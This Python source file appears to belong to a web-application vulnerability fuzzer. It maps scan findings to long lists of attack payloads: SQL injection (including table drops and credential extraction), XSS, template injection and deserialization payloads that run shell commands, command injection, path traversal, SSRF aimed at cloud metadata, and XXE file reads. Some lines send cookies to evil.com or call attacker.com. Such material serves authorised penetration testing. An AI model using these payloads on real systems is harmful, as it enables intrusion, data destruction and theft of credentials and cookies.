import json
import random
import time
import asyncio
from urllib.parse import quote, unquote

def generate_targeted_payloads(scan_report, base_payloads):
    
    targeted_payloads = []
    vulnerability_patterns = scan_report.get('vulnerabilities', [])
    context_matches = scan_report.get('context_matches', {})
    
    vuln_mapping = {
        # SQL Injection patterns
        'sql_injection': generate_sql_payloads,
        'length_validator': generate_length_bypass_payloads,
        'size_validator': generate_size_bypass_payloads,
        'array_index_check': generate_array_overflow_payloads,
        
        # XSS patterns
        'xss': generate_advanced_xss_payloads,
        'equals_type_check': generate_type_confusion_payloads,
        'type_casting': generate_type_casting_payloads,
        
        # Command Injection
        'command_injection': generate_command_injection_payloads,
        'file_handling': generate_path_traversal_payloads,
        'network_io': generate_ssrf_payloads,
        
        # Deserialization
        'insecure_deserialization': generate_deserialization_payloads,
        'reflection': generate_reflection_payloads,
        'serialization': generate_serialization_payloads,
        
        # Other patterns
        'path_traversal': generate_path_traversal_payloads,
        'race_condition': generate_race_condition_payloads,
        'idor': generate_idor_payloads,
        'csrf': generate_csrf_payloads,
        'ssti': generate_ssti_payloads
    }
    
    # Generuj payloady dla każdej znalezionej podatności
    for vuln in vulnerability_patterns:
        vuln_type = vuln['pattern']
        if vuln_type in vuln_mapping:
            generated = vuln_mapping[vuln_type](base_payloads, vuln, context_matches)
            targeted_payloads.extend(generated)
    
    return targeted_payloads

def generate_advanced_xss_payloads(base_payloads, vulnerability, context_matches):
    
    advanced_payloads = []
    
    base_xss = [p for p in base_payloads if p['category'] == 'HTML']
    
    advanced_techniques = [
        {'suffix': '<img src=x onerror=alert(1)>', 'category': 'mXSS'},
        {'suffix': '<svg onload=alert(1)>', 'category': 'mXSS'},
        {'suffix': '<math href=javascript:alert(1)>', 'category': 'mXSS'},
        
        {'suffix': '"><script>alert(1)</script>', 'category': 'DOM_XSS'},
        {'suffix': 'javascript:alert(1)', 'category': 'DOM_XSS'},
        {'suffix': 'data:text/html,<script>alert(1)</script>', 'category': 'DOM_XSS'},
        
        {'suffix': '{{7*7}}', 'category': 'SSTI'},
        {'suffix': '${7*7}', 'category': 'SSTI'},
        {'suffix': '<%= 7*7 %>', 'category': 'SSTI'},
        
        {'suffix': '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e', 'category': 'ENCODED_XSS'},
        {'suffix': '&lt;script&gt;alert(1)&lt;/script&gt;', 'category': 'HTML_ENTITY_XSS'}
    ]
    
    for base in base_xss:
        for technique in advanced_techniques:
            advanced_payload = {
                'inputField': base['inputField'] + technique['suffix'],
                'category': f"ADV_{technique['category']}",
                'targeted_vulnerability': vulnerability['pattern'],
                'confidence': 0.8
            }
            advanced_payloads.append(advanced_payload)
    
    return advanced_payloads

def generate_sql_payloads(base_payloads, vulnerability, context_matches):
    
    sql_payloads = []
    
    basic_sql = [
        {"inputField": "' OR '1'='1' -- ", "category": "SQL"},
        {"inputField": "' UNION SELECT username, password FROM users--", "category": "SQL"},
        {"inputField": "' AND 1=1--", "category": "SQL"},
        {"inputField": "' AND 1=2--", "category": "SQL"},
        {"inputField": "'; DROP TABLE users--", "category": "SQL"},
        {"inputField": "' OR SLEEP(5)--", "category": "SQL_TIME"},
        {"inputField": "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "category": "SQL_TIME"}
    ]
    
    advanced_sql = [
        {"inputField": "' AND (SELECT SUBSTRING(@@version,1,1))='5'--", "category": "SQL_BOOLEAN"},
        {"inputField": "' AND (SELECT ASCII(SUBSTRING((SELECT USER()),1,1)))>0--", "category": "SQL_BOOLEAN"},
        
        {"inputField": "' AND EXTRACTVALUE(1,CONCAT(0x5c,@@version))--", "category": "SQL_ERROR"},
        {"inputField": "' AND GTID_SUBSET(@@version,0)--", "category": "SQL_ERROR"},

        {"inputField": "' UNION SELECT 1--", "category": "SQL_UNION"},
        {"inputField": "' UNION SELECT 1,2--", "category": "SQL_UNION"},
        {"inputField": "' UNION SELECT 1,2,3--", "category": "SQL_UNION"},
        {"inputField": "' UNION SELECT @@version,2,3--", "category": "SQL_UNION"}
    ]
    
    for payload in basic_sql + advanced_sql:
        payload['targeted_vulnerability'] = vulnerability['pattern']
        payload['confidence'] = 0.9
        sql_payloads.append(payload)
    
    return sql_payloads

def generate_deserialization_payloads(base_payloads, vulnerability, context_matches):
    
    deserialization_payloads = []
    
    java_deserialization = [
        {"inputField": "rO0ABX", "category": "JAVA_DESERIALIZATION"},
        {"inputField": "aced0005", "category": "JAVA_DESERIALIZATION"},
        {"inputField": "\\xac\\xed\\x00\\x05", "category": "JAVA_DESERIALIZATION"}
    ]
    
    json_deserialization = [
        {"inputField": '{"@type":"java.net.URL","val":"http://attacker.com"}', "category": "JSON_DESERIALIZATION"},
        {"inputField": '{"@type":"java.net.InetAddress","val":"attacker.com"}', "category": "JSON_DESERIALIZATION"},
        {"inputField": '{"@type":"com.thoughtworks.xstream.mapper.DefaultMapper"}', "category": "JSON_DESERIALIZATION"}
    ]
    
    xxe_payloads = [
        {"inputField": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', "category": "XXE"},
        {"inputField": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>', "category": "XXE"}
    ]
    
    for payload in java_deserialization + json_deserialization + xxe_payloads:
        payload['targeted_vulnerability'] = vulnerability['pattern']
        payload['confidence'] = 0.7
        deserialization_payloads.append(payload)
    
    return deserialization_payloads

def generate_ssrf_payloads(base_payloads, vulnerability, context_matches):
    
    ssrf_payloads = []
    
    ssrf_payload_list = [
        # Internal services
        {"inputField": "http://localhost:22", "category": "SSRF_INTERNAL"},
        {"inputField": "http://127.0.0.1:3306", "category": "SSRF_INTERNAL"},
        {"inputField": "http://internal.service", "category": "SSRF_INTERNAL"},
        
        # Cloud metadata
        {"inputField": "http://169.254.169.254/latest/meta-data/", "category": "SSRF_AWS"},
        {"inputField": "http://metadata.google.internal/computeMetadata/v1/", "category": "SSRF_GCP"},
        
        # File protocol
        {"inputField": "file:///etc/passwd", "category": "SSRF_FILE"},
        {"inputField": "file:///c:/windows/win.ini", "category": "SSRF_FILE"},
        
        # Other protocols
        {"inputField": "gopher://127.0.0.1:25/xHELO%20localhost", "category": "SSRF_GOPHER"},
        {"inputField": "dict://127.0.0.1:22/info", "category": "SSRF_DICT"}
    ]
    
    for payload in ssrf_payload_list:
        payload['targeted_vulnerability'] = vulnerability['pattern']
        payload['confidence'] = 0.8
        ssrf_payloads.append(payload)
    
    return ssrf_payloads

def generate_command_injection_payloads(base_payloads, vulnerability, context_matches):
    
    command_payloads = []
    
    cmd_payloads = [
        # Unix command injection
        {"inputField": "; ls -la /", "category": "COMMAND_UNIX"},
        {"inputField": "| cat /etc/passwd", "category": "COMMAND_UNIX"},
        {"inputField": "& whoami", "category": "COMMAND_UNIX"},
        {"inputField": "`id`", "category": "COMMAND_UNIX"},
        {"inputField": "$(id)", "category": "COMMAND_UNIX"},
        
        # Windows command injection
        {"inputField": "| dir C:\\", "category": "COMMAND_WINDOWS"},
        {"inputField": "& whoami", "category": "COMMAND_WINDOWS"},
        {"inputField": "; ipconfig", "category": "COMMAND_WINDOWS"},
        
        # Blind command injection
        {"inputField": "| sleep 5", "category": "COMMAND_BLIND"},
        {"inputField": "& ping -c 5 127.0.0.1", "category": "COMMAND_BLIND"}
    ]
    
    for payload in cmd_payloads:
        payload['targeted_vulnerability'] = vulnerability['pattern']
        payload['confidence'] = 0.7
        command_payloads.append(payload)
    
    return command_payloads

def generate_path_traversal_payloads(base_payloads, vulnerability, context_matches):
    
    path_payloads = []
    
    traversal_payloads = [
        # Basic traversal
        {"inputField": "../../../etc/passwd", "category": "PATH_TRAVERSAL"},
        {"inputField": "..\\..\\..\\windows\\win.ini", "category": "PATH_TRAVERSAL"},
        
        # Encoded traversal
        {"inputField": "..%2f..%2f..%2fetc%2fpasswd", "category": "PATH_TRAVERSAL_ENCODED"},
        {"inputField": "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", "category": "PATH_TRAVERSAL_UTF8"},
        
        # Absolute paths
        {"inputField": "/etc/passwd", "category": "PATH_TRAVERSAL_ABSOLUTE"},
        {"inputField": "C:\\Windows\\System32\\drivers\\etc\\hosts", "category": "PATH_TRAVERSAL_ABSOLUTE"}
    ]
    
    for payload in traversal_payloads:
        payload['targeted_vulnerability'] = vulnerability['pattern']
        payload['confidence'] = 0.6
        path_payloads.append(payload)
    
    return path_payloads

def generate_ssti_payloads(base_payloads, vulnerability, context_matches):
    
    ssti_payloads = []
    
    ssti_payload_list = [
        # Basic template injection
        {"inputField": "{{7*7}}", "category": "SSTI"},
        {"inputField": "${7*7}", "category": "SSTI"},
        {"inputField": "<%= 7*7 %>", "category": "SSTI"},
        
        # Command execution
        {"inputField": "{{''.__class__.__mro__[1].__subclasses__()}}", "category": "SSTI_PYTHON"},
        {"inputField": "${T(java.lang.Runtime).getRuntime().exec('whoami')}", "category": "SSTI_JAVA"},
        {"inputField": "<%= system('whoami') %>", "category": "SSTI_RUBY"}
    ]
    
    for payload in ssti_payload_list:
        payload['targeted_vulnerability'] = vulnerability['pattern']
        payload['confidence'] = 0.7
        ssti_payloads.append(payload)
    
    return ssti_payloads

def generate_idor_payloads(base_payloads, vulnerability, context_matches):
    
    idor_payloads = []
    
    idor_payload_list = [
        # Parameter manipulation
        {"inputField": "../admin", "category": "IDOR"},
        {"inputField": "?id=1", "category": "IDOR"},
        {"inputField": "?user_id=0", "category": "IDOR"},
        {"inputField": "?account=administrator", "category": "IDOR"},
        
        # UUID manipulation
        {"inputField": "00000000-0000-0000-0000-000000000000", "category": "IDOR_UUID"},
        {"inputField": "FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF", "category": "IDOR_UUID"}
    ]
    
    for payload in idor_payload_list:
        payload['targeted_vulnerability'] = vulnerability['pattern']
        payload['confidence'] = 0.5
        idor_payloads.append(payload)
    
    return idor_payloads

def generate_csrf_payloads(base_payloads, vulnerability, context_matches):
    
    csrf_payloads = []
    
    csrf_payload_list = [
        # CSRF payload templates
        {"inputField": "<form action='http://evil.com' method='POST'>", "category": "CSRF"},
        {"inputField": "<img src='http://target.com/logout'>", "category": "CSRF"},
        {"inputField": "<script>fetch('http://target.com/delete-account')</script>", "category": "CSRF"}
    ]
    
    for payload in csrf_payload_list:
        payload['targeted_vulnerability'] = vulnerability['pattern']
        payload['confidence'] = 0.6
        csrf_payloads.append(payload)
    
    return csrf_payloads


def generate_length_bypass_payloads(base_payloads, vulnerability, context_matches):
    
    length_bypass_payloads = []
    
    bypass_techniques = [
        {"inputField": "test\\x00", "category": "LENGTH_BYPASS_NULL"},
        {"inputField": "admin\\x00", "category": "LENGTH_BYPASS_NULL"},
        
        {"inputField": "ｔｅｓｔ", "category": "LENGTH_BYPASS_UNICODE"},  # Full-width characters
        {"inputField": "𝕥𝕖𝕤𝕥", "category": "LENGTH_BYPASS_UNICODE"},  # Mathematical alphanumeric
        
        {"inputField": "test" * 100, "category": "LENGTH_BYPASS_REPEAT"},  # Repeat pattern
        {"inputField": "A" * 10000, "category": "LENGTH_BYPASS_OVERFLOW"},  # Buffer overflow attempt
        
        {"inputField": "test%C0%AF", "category": "LENGTH_BYPASS_UTF8"},
        {"inputField": "test%252F", "category": "LENGTH_BYPASS_DOUBLE_ENCODE"},
        
        {"inputField": "test[]", "category": "LENGTH_BYPASS_ARRAY"},
        {"inputField": '{"length": 1000}', "category": "LENGTH_BYPASS_OBJECT"},
        
        {"inputField": "test\\r\\n", "category": "LENGTH_BYPASS_NEWLINE"},
        {"inputField": "test\\t", "category": "LENGTH_BYPASS_TAB"},
    ]
    
    for technique in bypass_techniques:
        technique['targeted_vulnerability'] = vulnerability['pattern']
        technique['confidence'] = 0.6
        length_bypass_payloads.append(technique)
    
    return length_bypass_payloads

def generate_size_bypass_payloads(base_payloads, vulnerability, context_matches):
    
    size_bypass_payloads = []
    
    bypass_techniques = [
        {"inputField": "4\\r\\ntest\\r\\n0\\r\\n\\r\\n", "category": "SIZE_BYPASS_CHUNKED"},
        
        {"inputField": "\\x1f\\x8b\\x08\\x00", "category": "SIZE_BYPASS_GZIP"},
        
        {"inputField": "------WebKitFormBoundary\\r\\nContent-Disposition: form-data; name=\"test\"\\r\\n\\r\\ntest_value\\r\\n------WebKitFormBoundary--", 
         "category": "SIZE_BYPASS_MULTIPART"},
        
        # JSON nesting
        {"inputField": '{"data": {"nested": {"deep": "value"}}}', "category": "SIZE_BYPASS_JSON_NEST"},
        {"inputField": '{"array": ["' + '","'.join([f"item{i}" for i in range(100)]) + '"]}', 
         "category": "SIZE_BYPASS_JSON_ARRAY"},
        
        # XML entity expansion
        {"inputField": '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY x "a"><!ENTITY x1 "&x;&x;">]><test>&x1;</test>', 
         "category": "SIZE_BYPASS_XML_ENTITY"},
        
        # Boundary condition testing
        {"inputField": "A" * 1024, "category": "SIZE_BYPASS_1KB"},
        {"inputField": "A" * 10240, "category": "SIZE_BYPASS_10KB"},
        {"inputField": "A" * 102400, "category": "SIZE_BYPASS_100KB"},
    ]
    
    for technique in bypass_techniques:
        technique['targeted_vulnerability'] = vulnerability['pattern']
        technique['confidence'] = 0.5
        size_bypass_payloads.append(technique)
    
    return size_bypass_payloads

def generate_array_overflow_payloads(base_payloads, vulnerability, context_matches):
    
    array_overflow_payloads = []

    overflow_techniques = [
        # Negative indices
        {"inputField": "array[-1]", "category": "ARRAY_OVERFLOW_NEGATIVE"},
        {"inputField": "array[-999999]", "category": "ARRAY_OVERFLOW_NEGATIVE_LARGE"},
        
        # Large indices
        {"inputField": "array[999999]", "category": "ARRAY_OVERFLOW_LARGE"},
        {"inputField": "array[2147483647]", "category": "ARRAY_OVERFLOW_MAX_INT"},
        {"inputField": "array[4294967295]", "category": "ARRAY_OVERFLOW_MAX_UINT"},
        
        # Out of bounds access
        {"inputField": "array[0][0][0]", "category": "ARRAY_OVERFLOW_DEEP"},
        {"inputField": "array.length", "category": "ARRAY_OVERFLOW_LENGTH"},
        
        # Type confusion
        {"inputField": "array[null]", "category": "ARRAY_OVERFLOW_NULL"},
        {"inputField": "array[undefined]", "category": "ARRAY_OVERFLOW_UNDEFINED"},
        {"inputField": "array[true]", "category": "ARRAY_OVERFLOW_BOOLEAN"},
        {"inputField": "array[1.1]", "category": "ARRAY_OVERFLOW_FLOAT"},
        
        # Special characters in indices
        {"inputField": "array[1e308]", "category": "ARRAY_OVERFLOW_EXPONENTIAL"},
        {"inputField": "array[Infinity]", "category": "ARRAY_OVERFLOW_INFINITY"},
        {"inputField": "array[NaN]", "category": "ARRAY_OVERFLOW_NAN"},
    ]
    
    for technique in overflow_techniques:
        technique['targeted_vulnerability'] = vulnerability['pattern']
        technique['confidence'] = 0.7
        array_overflow_payloads.append(technique)
    
    return array_overflow_payloads

def generate_type_confusion_payloads(base_payloads, vulnerability, context_matches):
    
    type_confusion_payloads = []
    
    confusion_techniques = [
        {"inputField": '{"__proto__":{"isAdmin":true}}', "category": "TYPE_CONFUSION_PROTO"},
        {"inputField": '{"constructor":{"prototype":{"isAdmin":true}}}', "category": "TYPE_CONFUSION_CONSTRUCTOR"},
        
        # Type juggling
        {"inputField": "0", "category": "TYPE_CONFUSION_ZERO"},
        {"inputField": "true", "category": "TYPE_CONFUSION_TRUE"},
        {"inputField": "false", "category": "TYPE_CONFUSION_FALSE"},
        {"inputField": "null", "category": "TYPE_CONFUSION_NULL"},
        {"inputField": "undefined", "category": "TYPE_CONFUSION_UNDEFINED"},
        
        # Loose comparison exploitation
        {"inputField": "0e12345", "category": "TYPE_CONFUSION_SCIENTIFIC"},
        {"inputField": "0x0", "category": "TYPE_CONFUSION_HEX"},
        {"inputField": "0b0", "category": "TYPE_CONFUSION_BINARY"},
        
        # Array/object confusion
        {"inputField": "[]", "category": "TYPE_CONFUSION_EMPTY_ARRAY"},
        {"inputField": "{}", "category": "TYPE_CONFUSION_EMPTY_OBJECT"},
        {"inputField": "[object Object]", "category": "TYPE_CONFUSION_OBJECT_STRING"},
        
        # Function constructor abuse
        {"inputField": "Function", "category": "TYPE_CONFUSION_FUNCTION"},
        {"inputField": "constructor", "category": "TYPE_CONFUSION_CONSTRUCTOR_KEY"},
    ]
    
    for technique in confusion_techniques:
        technique['targeted_vulnerability'] = vulnerability['pattern']
        technique['confidence'] = 0.6
        type_confusion_payloads.append(technique)
    
    return type_confusion_payloads

def generate_type_casting_payloads(base_payloads, vulnerability, context_matches):
    
    type_casting_payloads = []
    
    casting_techniques = [
        {"inputField": "123abc", "category": "TYPE_CASTING_STRING_NUMBER"},
        {"inputField": "123.456.789", "category": "TYPE_CASTING_FLOAT_INVALID"},
        {"inputField": "0x123xyz", "category": "TYPE_CASTING_HEX_INVALID"},
        
        {"inputField": "1", "category": "TYPE_CASTING_BOOLEAN_TRUE"},
        {"inputField": "0", "category": "TYPE_CASTING_BOOLEAN_FALSE"},
        {"inputField": "yes", "category": "TYPE_CASTING_BOOLEAN_YES"},
        {"inputField": "no", "category": "TYPE_CASTING_BOOLEAN_NO"},
        
        {"inputField": "[1,2,3]", "category": "TYPE_CASTING_ARRAY"},
        {"inputField": "1,2,3", "category": "TYPE_CASTING_CSV"},
        
        {"inputField": '{"key":"value"}', "category": "TYPE_CASTING_OBJECT"},
        {"inputField": "key:value", "category": "TYPE_CASTING_KEY_VALUE"},
        
        {"inputField": "NaN", "category": "TYPE_CASTING_NAN"},
        {"inputField": "Infinity", "category": "TYPE_CASTING_INFINITY"},
        {"inputField": "-Infinity", "category": "TYPE_CASTING_NEG_INFINITY"},
        
        {"inputField": "2023-01-01", "category": "TYPE_CASTING_DATE"},
        {"inputField": "12:30:45", "category": "TYPE_CASTING_TIME"},
        {"inputField": "2023-01-01T12:30:45Z", "category": "TYPE_CASTING_DATETIME"},
    ]
    
    for technique in casting_techniques:
        technique['targeted_vulnerability'] = vulnerability['pattern']
        technique['confidence'] = 0.5
        type_casting_payloads.append(technique)
    
    return type_casting_payloads

def generate_reflection_payloads(base_payloads, vulnerability, context_matches):
    
    reflection_payloads = []
    
    reflection_techniques = [
        # Java reflection
        {"inputField": "java.lang.Runtime", "category": "REFLECTION_JAVA_RUNTIME"},
        {"inputField": "java.lang.Class", "category": "REFLECTION_JAVA_CLASS"},
        {"inputField": "java.lang.System", "category": "REFLECTION_JAVA_SYSTEM"},
        
        # Method invocation
        {"inputField": "getRuntime", "category": "REFLECTION_METHOD_GETRUNTIME"},
        {"inputField": "exec", "category": "REFLECTION_METHOD_EXEC"},
        {"inputField": "getMethod", "category": "REFLECTION_METHOD_GETMETHOD"},
        
        # Property access
        {"inputField": "class", "category": "REFLECTION_PROPERTY_CLASS"},
        {"inputField": "constructor", "category": "REFLECTION_PROPERTY_CONSTRUCTOR"},
        {"inputField": "prototype", "category": "REFLECTION_PROPERTY_PROTOTYPE"},
        
        # Dynamic code execution
        {"inputField": "eval", "category": "REFLECTION_EVAL"},
        {"inputField": "Function", "category": "REFLECTION_FUNCTION"},
        {"inputField": "setTimeout", "category": "REFLECTION_SETTIMEOUT"},
        {"inputField": "setInterval", "category": "REFLECTION_SETINTERVAL"},
    ]
    
    for technique in reflection_techniques:
        technique['targeted_vulnerability'] = vulnerability['pattern']
        technique['confidence'] = 0.7
        reflection_payloads.append(technique)
    
    return reflection_payloads

def generate_serialization_payloads(base_payloads, vulnerability, context_matches):
    
    serialization_payloads = []
    
    serialization_techniques = [
        # PHP serialization
        {"inputField": 'O:8:"stdClass":0:{}', "category": "SERIALIZATION_PHP"},
        {"inputField": 'a:1:{s:4:"test";s:5:"value";}', "category": "SERIALIZATION_PHP_ARRAY"},
        
        # Python pickle
        {"inputField": "cos\\nsystem\\n(S'whoami'\\ntR.", "category": "SERIALIZATION_PYTHON_PICKLE"},
        
        # Java serialization
        {"inputField": "\\xac\\xed\\x00\\x05", "category": "SERIALIZATION_JAVA"},
        {"inputField": "rO0ABX", "category": "SERIALIZATION_JAVA_BASE64"},
        
        # JSON with special properties
        {"inputField": '{"__proto__": {"isAdmin": true}}', "category": "SERIALIZATION_JSON_PROTO"},
        {"inputField": '{"constructor": {"prototype": {"isAdmin": true}}}', "category": "SERIALIZATION_JSON_CONSTRUCTOR"},
        
        # XML serialization
        {"inputField": '<?xml version="1.0"?><root><test>value</test></root>', "category": "SERIALIZATION_XML"},
        
        # YAML serialization
        {"inputField": "!!python/object/apply:os.system ['whoami']", "category": "SERIALIZATION_YAML"},
    ]
    
    for technique in serialization_techniques:
        technique['targeted_vulnerability'] = vulnerability['pattern']
        technique['confidence'] = 0.6
        serialization_payloads.append(technique)
    
    return serialization_payloads

def generate_race_condition_payloads(base_payloads, vulnerability, context_matches):
    
    race_condition_payloads = []
    
    race_techniques = [
        # Concurrent requests simulation
        {"inputField": "race_test_1", "category": "RACE_CONDITION_CONCURRENT"},
        {"inputField": "race_test_2", "category": "RACE_CONDITION_CONCURRENT"},
        {"inputField": "race_test_3", "category": "RACE_CONDITION_CONCURRENT"},
        
        # TOCTOU (Time-of-Check-Time-of-Use)
        {"inputField": "../../../etc/passwd", "category": "RACE_CONDITION_TOCTOU"},
        {"inputField": "/tmp/race_file", "category": "RAME_CONDITION_TOCTOU_TMP"},
        
        # Session racing
        {"inputField": "session_race_1", "category": "RACE_CONDITION_SESSION"},
        {"inputField": "session_race_2", "category": "RACE_CONDITION_SESSION"},
        
        # File upload racing
        {"inputField": "upload_race_test", "category": "RACE_CONDITION_UPLOAD"},
        {"inputField": "malicious.php", "category": "RACE_CONDITION_UPLOAD_PHP"},
        
        # Database racing
        {"inputField": "db_race_1", "category": "RACE_CONDITION_DATABASE"},
        {"inputField": "db_race_2", "category": "RACE_CONDITION_DATABASE"},
    ]
    
    for technique in race_techniques:
        technique['targeted_vulnerability'] = vulnerability['pattern']
        technique['confidence'] = 0.4  # Race conditions are harder to detect
        race_condition_payloads.append(technique)
    
    return race_condition_payloads


def generate_encoding_confusion_payloads(base_payloads, vulnerability, context_matches):
    
    encoding_payloads = []
    
    encoding_techniques = [
        # Multiple encoding layers
        {"inputField": "%253Cscript%253Ealert(1)%253C%252Fscript%253E", "category": "ENCODING_DOUBLE_URL"},
        {"inputField": "&lt;script&gt;alert(1)&lt;/script&gt;", "category": "ENCODING_HTML_ENTITY"},
        {"inputField": "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e", "category": "ENCODING_UNICODE"},
        
        # Mixed encoding
        {"inputField": "%3Cscript%3Ealert(1)%3C/script%3E", "category": "ENCODING_MIXED"},
        {"inputField": "&lt;script&gt;alert%281%29&lt;/script&gt;", "category": "ENCODING_MIXED_HTML_URL"},
        
        # UTF-7 encoding
        {"inputField": "+ADw-script+AD4-alert(1)+ADw-/script+AD4-", "category": "ENCODING_UTF7"},
        
        # UTF-8 overlong sequences
        {"inputField": "\\xC0\\xBCscript\\xC0\\xBEalert(1)\\xC0\\xBC/script\\xC0\\xBE", "category": "ENCODING_UTF8_OVERLONG"},
    ]
    
    for technique in encoding_techniques:
        technique['targeted_vulnerability'] = vulnerability['pattern']
        technique['confidence'] = 0.5
        encoding_payloads.append(technique)
    
    return encoding_payloads

def generate_context_aware_payloads(base_payloads, vulnerability, context_matches):
    
    context_payloads = []

    base_payloads_list = base_payloads if base_payloads else [
        {"inputField": "test", "category": "CONTEXT_BASE"}
    ]
    
    if any(ctx in context_matches for ctx in ['financial_vars', 'financial_context']):
        financial_payloads = [
            {"inputField": "-0.01", "category": "CONTEXT_FINANCIAL_NEGATIVE"},
            {"inputField": "999999999.99", "category": "CONTEXT_FINANCIAL_LARGE"},
            {"inputField": "0.0000000000000000000000000001", "category": "CONTEXT_FINANCIAL_SMALL"},
            {"inputField": "1e308", "category": "CONTEXT_FINANCIAL_EXPONENTIAL"},
        ]
        context_payloads.extend(financial_payloads)
    
    if any(ctx in context_matches for ctx in ['authentication_context', 'session_vars']):
        auth_payloads = [
            {"inputField": "../../../etc/passwd", "category": "CONTEXT_AUTH_FILE"},
            {"inputField": "admin' OR '1'='1", "category": "CONTEXT_AUTH_SQL"},
            {"inputField": "<script>document.location='http://evil.com/'+document.cookie</script>", 
             "category": "CONTEXT_AUTH_XSS"},
        ]
        context_payloads.extend(auth_payloads)
    
    if 'personal_data_vars' in context_matches:
        personal_payloads = [
            {"inputField": "John' OR 1=1--", "category": "CONTEXT_PERSONAL_SQL"},
            {"inputField": "<img src=x onerror=alert(document.cookie)>", "category": "CONTEXT_PERSONAL_XSS"},
            {"inputField": "../../../etc/passwd", "category": "CONTEXT_PERSONAL_PATH"},
        ]
        context_payloads.extend(personal_payloads)
    
    for payload in base_payloads_list:
        payload['targeted_vulnerability'] = vulnerability['pattern']
        payload['confidence'] = 0.6
        context_payloads.append(payload)
    
    return context_payloads
